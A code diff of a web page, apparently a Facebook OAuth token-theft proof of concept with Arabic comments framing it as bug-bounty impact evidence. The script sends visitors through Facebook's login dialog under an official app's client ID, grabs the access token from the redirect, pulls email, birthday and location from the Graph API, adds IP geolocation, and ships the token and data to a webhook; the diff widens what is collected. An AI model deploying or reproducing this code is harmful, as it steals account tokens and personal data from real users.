@@ -12,23 +12,26 @@
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
 
                 try {
-                    // محاكاة استغلال صمودة: جلب البريد، الـ ID، وتاريخ الميلاد، ومعرف الجهاز إن أمكن
+                    // محاكاة صمودة: جلب البيانات الحساسة التي أثبتت نجاحك في الصور السابقة
                     const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday,location&access_token=${token}`);
                     const userData = await response.json();
 
-                    // إرسال البيانات المسربة فوراً (التي تثبت الأثر الضار كما طلب صمويل)
+                    // إرسال الـ ID (920929380607450) والبيانات فوراً للـ Webhook
                     const exfil = new Image();
-                    exfil.src = `${webhookUrl}?LEAKED_TOKEN=${token}&FB_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}`;
+                    exfil.src = `${webhookUrl}?FOUND_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}&DATA=${encodeURIComponent(JSON.stringify(userData))}`;
 
-                    // تسجيل بصمة الجهاز (Device Fingerprint) لإثبات إمكانية الـ ATO
+                    // تسجيل بصمة الجهاز والموقع لإثبات الأثر الضار لميتا
+                    const geoRes = await fetch('https://ipapi.co/json/');
+                    const geoData = await geoRes.json();
+                    
                     await fetch(webhookUrl, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({
-                            type: "Sammouda-Style-Exploitation",
-                            token: token,
-                            account_info: userData,
-                            user_agent: navigator.userAgent
+                            impact: "Account Data Exfiltration via Redirect",
+                            victim_id: userData.id,
+                            geo: geoData,
+                            token: token
                         })
                     });
 
@@ -37,8 +40,8 @@
                     window.location.href = "https://www.facebook.com/me";
                 }
             } else {
-                // استخدام تطبيق فيسبوك الرسمي (Client ID: 124024574287414) لرفع قوة الاستغلال
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=124024574287414&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday";
+                // استخدام Client ID لتطبيق رسمي لزيادة قوة التقرير
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=124024574287414&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday,user_location";
             }
         };
     </script>
